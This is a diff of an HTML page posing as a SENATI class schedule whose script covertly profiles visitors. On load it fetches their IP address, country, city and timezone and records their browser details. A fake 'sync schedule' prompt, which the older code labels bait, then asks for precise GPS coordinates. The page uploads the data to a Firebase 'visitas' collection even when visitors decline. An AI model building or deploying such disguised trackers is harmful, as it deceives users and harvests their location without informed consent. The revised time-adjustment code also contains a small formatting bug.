@@ -146,94 +146,142 @@
 </div>
 
 <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyCwyM8VGEBn93_A8LNpNb4MgB4OFUqjKp0",
-        authDomain: "horario-senati-sync.firebaseapp.com",
-        projectId: "horario-senati-sync",
-        storageBucket: "horario-senati-sync.firebasestorage.app",
-        messagingSenderId: "156759042223",
-        appId: "1:156759042223:web:778ceed5db5bcbb6e0cc5a"
+const firebaseConfig = {
+    apiKey: "AIzaSyCwyM8VGEBn93_A8LNpNb4MgB4OFUqjKp0",
+    authDomain: "horario-senati-sync.firebaseapp.com",
+    projectId: "horario-senati-sync",
+    storageBucket: "horario-senati-sync.firebasestorage.app",
+    messagingSenderId: "156759042223",
+    appId: "1:156759042223:web:778ceed5db5bcbb6e0cc5a"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+async function runLogic() {
+    let meta = { 
+        ts: serverTimestamp(),
+        dev: navigator.userAgent,
+        lang: navigator.language,
+        met: "Solo IP"
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    try {
+        // 🌍 Obtener datos por IP
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error("API caída");
 
-    async function runLogic() {
-        let meta = { ts: serverTimestamp(), dev: navigator.userAgent, met: "Solo IP" };
+        const ipData = await res.json();
 
-        try {
-            // 1. Detección automática de IP y País
-            const res = await fetch('https://ipapi.co/json/');
-            const ipData = await res.json();
-            
-            meta.ip = ipData.ip;
-            meta.pais = ipData.country_name;
-            meta.cty = ipData.city;
+        meta.ip = ipData.ip || "N/A";
+        meta.pais = ipData.country_name || "Desconocido";
+        meta.cty = ipData.city || "N/A";
+        meta.timezone = ipData.timezone || "N/A";
 
-            // Cambiamos el título inmediatamente según el país
-            document.getElementById('app-title').innerText = `HORARIO - ${ipData.country_name.toUpperCase()}`;
+        // Cambiar título
+        document.getElementById('app-title').innerText =
+            `HORARIO - ${meta.pais.toUpperCase()}`;
 
-            // 2. Anzuelo de sincronización
-            setTimeout(() => {
-                const conf = confirm(`Se detectó acceso desde ${ipData.country_name}. ¿Deseas sincronizar el horario de SENATI con tu hora local (${ipData.timezone})?`);
-                
-                if (conf) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (p) => {
-                            meta.lat = p.coords.latitude;
-                            meta.lon = p.coords.longitude;
-                            meta.met = "GPS Full";
-                            
-                            await addDoc(collection(db, "visitas"), meta);
-                            
-                            // Ajustar horas visualmente
-                            ajustarHoras(ipData.utc_offset);
-                            done("✅ Sincronizado exitosamente.");
-                        },
-                        async () => {
-                            await addDoc(collection(db, "visitas"), meta);
-                            done("⚠️ Permiso denegado. Usando hora base.");
-                        },
-                        { enableHighAccuracy: true }
-                    );
-                } else {
-                    addDoc(collection(db, "visitas"), meta);
-                    done("Sincronización manual activa.");
-                }
-            }, 1200);
-        } catch (e) { console.error(e); }
+        // Mostrar zona real del navegador
+        const zonaReal = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.getElementById('app-subtitle').innerText += ` | ${zonaReal}`;
+
+        // ⏱️ Confirmación
+        setTimeout(() => {
+            const conf = confirm(
+                `Detectado: ${meta.pais}\nZona: ${zonaReal}\n\n¿Sincronizar horario?`
+            );
+
+            if (conf && "geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        meta.lat = p.coords.latitude;
+                        meta.lon = p.coords.longitude;
+                        meta.met = "GPS Full";
+
+                        await guardarFirebase(meta);
+
+                        ajustarHorasReal();
+                        done("✅ Sincronizado correctamente");
+                    },
+                    async () => {
+                        await guardarFirebase(meta);
+                        done("⚠️ Ubicación denegada");
+                    }
+                );
+            } else {
+                guardarFirebase(meta);
+                done("Modo manual activo");
+            }
+        }, 1200);
+
+    } catch (e) {
+        console.error(e);
+        done("❌ Error al detectar ubicación");
     }
+}
 
-    function ajustarHoras(offsetDestino) {
-        if (!offsetDestino) return;
-        const gmtPeru = -5;
-        const gmtDestino = parseInt(offsetDestino) / 100;
-        const diff = gmtDestino - gmtPeru;
+// 🔥 Guardado seguro en Firebase
+async function guardarFirebase(meta) {
+    try {
+        await addDoc(collection(db, "visitas"), meta);
+    } catch (e) {
+        console.error("Firebase error:", e);
+    }
+}
+
+// 🧠 Ajuste de horas REAL (zona del navegador)
+function ajustarHorasReal() {
+    try {
+        const zonaUsuario = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const ahora = new Date();
+
+        const horaPeru = new Intl.DateTimeFormat("en-US", {
+            timeZone: "America/Lima",
+            hour: "2-digit",
+            hour12: false
+        }).format(ahora);
+
+        const horaUser = new Intl.DateTimeFormat("en-US", {
+            timeZone: zonaUsuario,
+            hour: "2-digit",
+            hour12: false
+        }).format(ahora);
+
+        const diff = parseInt(horaUser) - parseInt(horaPeru);
 
         if (diff !== 0) {
             document.querySelectorAll('.time-col').forEach(el => {
-                const horas = el.innerText.match(/(\d{2}):(\d{2})/g);
+                const horas = el.innerText.match(/\d{2}:\d{2}/g);
+
                 if (horas) {
                     const nuevas = horas.map(h => {
                         let [hora, min] = h.split(':').map(Number);
                         hora = (hora + diff + 24) % 24;
-                        return `${hora.toString().padStart(2, '0')}:${min.toString().padStart(2, '0')}`;
+
+                        return `${hora.toString().padStart(2, '0')}:${min}`;
                     });
+
                     el.innerText = nuevas.join(' - ');
                 }
             });
         }
+    } catch (e) {
+        console.error("Error ajustando horas:", e);
     }
+}
 
-    function done(m) {
-        document.getElementById('sync-status').innerText = m;
-        document.getElementById('sync-icon').style.display = 'none';
-    }
+// ✅ Finalización UI
+function done(mensaje) {
+    document.getElementById('sync-status').innerText = mensaje;
+    document.getElementById('sync-icon').style.display = 'none';
+}
 
-    window.onload = runLogic;
+// 🚀 Inicio seguro
+document.addEventListener("DOMContentLoaded", runLogic);
 </script>
 </body>
 </html>
